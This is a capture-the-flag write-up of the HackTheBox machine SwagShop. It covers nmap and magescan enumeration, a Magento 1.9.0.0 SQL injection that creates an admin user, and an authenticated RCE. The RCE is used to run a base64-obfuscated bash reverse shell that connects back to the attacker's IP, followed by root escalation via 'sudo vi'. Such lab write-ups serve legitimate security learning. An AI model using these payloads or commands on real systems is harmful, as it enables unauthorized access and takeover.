#box #phar #magento #SQLi #RCE #sudo-capabilities #vi
## Nmap

```bash
# Nmap 7.95 scan initiated Fri Sep 26 16:50:53 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 26 16:51:05 2025 -- 1 IP address (1 host up) scanned in 11.37 seconds
```

## 80 - HTTP

On port 80 we discover the presence of a website made with Magento, a CMS made for online shops. Unable to find a proper version of the app we opt to use [magescan](https://github.com/steverobbins/magescan).

> 
> To avoid issues within packages installation we directly download the `phar` file from here: https://github.com/steverobbins/magescan/releases/tag/v1.12.9.

```bash
php magescan.phar scan:all swagshop.htb
```

discovering that Magento's version is version <span style="background:#fff88f">1.9.0.0</span>.

![[attachments/swagshop-writeup-1.png]]

>Another important thing we've discovered is that any endpoint on the website redirects us to `http://swagshop.htb/index.php`. It feels like somehow `index.php` is appended at the end of the endpoint, like a directory.
### Unauthenticated SQLi

Within `searchsploit` we discover the presence of a few vulnerability on Magento's version `1.9.0.0`

![[attachments/swagshop-writeup-2.png]]

One seems to be Authenticated, the other one doesn't specify it.
We opt to look at the latter one, by checking its code it seems to navigate to an endpoint called `/admin/Cms_Wysisyg/directive/index/`, let's see if we can reach that:

```bash
curl http://swagshop.htb/index.php/admin/Cms_Wysiwyg/directive/index
```

Something seems to be there! Specifically, it's a login page:

![[attachments/swagshop-writeup-3.png]]

By checking the script, it seems to perform a SQLi to create an user and set it as an administrator:

```sql
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
```

If necessary, we can change the username and password on the `query` variable right after:

```python
query = q.replace("\n", "").format(username="forme", password="forme")
```

We'll keep them this way, since they're easy to remember.

We run the script:

![[attachments/swagshop-writeup-4.png]]

Obtaining an initial access on the administrator panel at `http://swagshop.htb/index.php/admin` with credentials: `forme:forme`. Let's try to access it.

Once authenticate in the administration panel we can try looking on the other RCE command
### Authenticated RCE

The other RCE is slightly more complex because it has a variety of points to rework and investigate to properly understand how it works. The exploit does the following steps:
* Authenticates with the credentials provided
* Looks in the DOM for a variable called `ajaxBlockUrl` (in this case on row 521) `ajaxBlockUrl = 'http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/646d59b6aefd84d61105a859bafc3121/'` and gets it
* Looks in the DOM for a variable called `FORM_KEY` (in this case on row 14) `var FORM_KEY = 'IwpaS59VIhY7ZDmd';` (this key varies at each session)
* Build the URL with `ajaxBlockUrl` + `block/tab_orders/period/7d/?isAjax=true` (the `7d` is a default that stands for 7days, it can be changed).
* Passes a POST request to this endpoint with data equal to `isAjax=false&form_key=FORM_KEY`.
* The answer of the POST shall provide a target payload that is then used to run the RCE by creating a signature with the `install_date` of magento.

#### Retrieving Magento's install_date

As suggested inside the script, the install_date can be found at `/app/etc/local.xml`. We tried both by appending `index.php` and without, discovering that without `index.php` the `xml` find is discovered. The install_date is: `Wed, 08 May 2019 07:23:09 +0000`.
We update the script, and we'll end up having the following variable set:

```python
username = 'forme'
password = 'forme'
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

We'll also comment out:

```python
br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
```

Since this is breaking our execution.

Finally, we can run the script:

```bash
python2.7 37811.py http://swagshop.htb/index.php/admin "whoami"
```

But we'll obtain the following error:

![[attachments/swagshop-writeup-5.png]]

Now, this process could be quite smooth, but the problem is that the application has no valid shipped orders. To fix this problem we must Ship an order from the application. Weird that the script didn't take care of it by manually shipping one before running the rest.

##### Shipping an order

When accessing the administrator panel, we can notice on the left a panel with written `Last 5 Orders`. When the box is ran by default those orders will exist onto the machine:

![[attachments/swagshop-writeup-6.png]]

The script is defining a timeframe of [7 days]([[Swagshop - Writeup#^x8cswq]]) but those orders are way older, they belong to 5 may 2019. Luckily, on the top right there's an option called `Reorder`
![[attachments/swagshop-writeup-9.png]]
Once clicked, we'll be redirected onto another page where we'll be able to `Submit` the order
![[attachments/swagshop-writeup-10.png]]
Finally, onto the new page we'll be able to click on `Ship` on the top right of the page:
![[attachments/swagshop-writeup-7.png]]
And lastly we'll be able to click on the bottom right on the button`Submit Shipment`
![[attachments/swagshop-writeup-8.png]]

At this point, we'll be able to run again the script above, successfully.

![[attachments/swagshop-writeup-11.png]]

---

Given that we finally have achieved a RCE, we can now proceed with leveraging that to get a shell on the target machine. Since we were unable to use the classic `bash -c '/bin/bash` command, we opted to encode the shell into a base64 payload that's going to be decrypted when executed. Our finally command will be the following:

```bash
python2.7 37811.py http://swagshop.htb/index.php/admin "echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjcvNDQ0NCAwPiYx' | base64 -d | bash" # nc -lvnp 4444
```

Obtaining a shell:

![[attachments/swagshop-writeup-12.png]]

## Privilege Escalation

The privilege escalation consists in an allowance in running `vi` as sudo.
On the target machine we run `sudo -l`

`vi` has a GTFOBins that says that sudo execution does not drop privileges [here](https://gtfobins.github.io/gtfobins/vi/#sudo).

It's important to notice that we have this control <u><span style="background:#d4b106">exclusively</span></u> on `/var/www/html/*`. So we can create a file with vi as sudo only in this folder.

Therefore, we run the following command, to catch a shell as `root`:

```bash
sudo vi /var/www/html/test -c ':!/bin/bash' /dev/null
```

>We must be running a Fully Interactive TTY to be able to perform the command above